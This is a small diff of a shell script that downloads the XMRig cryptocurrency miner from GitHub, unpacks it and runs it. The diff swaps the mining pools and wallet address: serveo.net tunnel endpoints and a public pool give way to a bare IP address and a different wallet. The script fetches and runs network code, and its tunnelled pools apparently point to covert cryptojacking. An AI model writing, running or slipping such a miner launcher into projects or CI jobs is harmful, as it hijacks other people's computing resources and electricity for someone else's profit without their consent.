@@ -4,4 +4,4 @@ curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "xmrig.*
 mkdir xm
 tar xvf xm.tar.gz -C xm --strip-components=1
 chmod +x ./xm/xmrig
-./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 -o serveo.net:44444 --nicehash -o serveo.net:33333 --nicehash -o serveo.net:22222 --nicehash -o serveo.net:11111 --nicehash -o pool.supportxmr.com:3333 -u 86x4EkchvMLLZcL16bG25rJCRRukq5MYyT1fhUq2bAFP1fD9hLVCgNY8tC3wknFVW9BPsv6xSJWBa8ofyscqLe1j7xvg9Uz -p hash1 -k
+./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 -o 163.172.153.31:3333 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p x -k
